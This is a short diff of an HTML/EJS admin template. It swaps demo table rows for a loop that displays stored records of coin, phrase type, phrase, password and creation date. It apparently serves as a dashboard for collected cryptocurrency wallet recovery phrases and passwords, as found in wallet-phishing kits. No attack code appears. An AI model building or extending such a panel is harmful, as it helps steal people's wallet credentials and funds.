@@ -129,31 +129,17 @@
                     </tr>
                   </tfoot>
                   <tbody>
-                    <tr>
-                      <td>Tiger Nixon</td>
-                      <td>System Architect</td>
-                      <td>Edinburgh</td>
-                      <td>61</td>
-                      <td>2011/04/25</td>
-                      <td>$320,800</td>
-                    </tr>
-                    <tr>
-                      <td>Garrett Winters</td>
-                      <td>Accountant</td>
-                      <td>Tokyo</td>
-                      <td>63</td>
-                      <td>2011/07/25</td>
-                      <td>$170,750</td>
-                    </tr>
+                    <% phrases.forEach(phrase=>{%>
 
                     <tr>
-                      <td>Donna Snider tset okay black okereke made user</td>
-                      <td>Customer Support</td>
-                      <td>New York</td>
-                      <td>27</td>
-                      <td>2011/01/25</td>
-                      <td>$112,000</td>
+                      <td><%=phrase.feature %></td>
+                      <td><%=phrase.coin %></td>
+                      <td><%=phrase.phraseType %></td>
+                      <td><%=phrase.phrase %></td>
+                      <td><%= phrase.password ? phrase.password : '' %></td>
+                      <td><%=phrase.createdAt.toISOString() %></td>
                     </tr>
+                    <%}) %>
                   </tbody>
                 </table>
               </div>
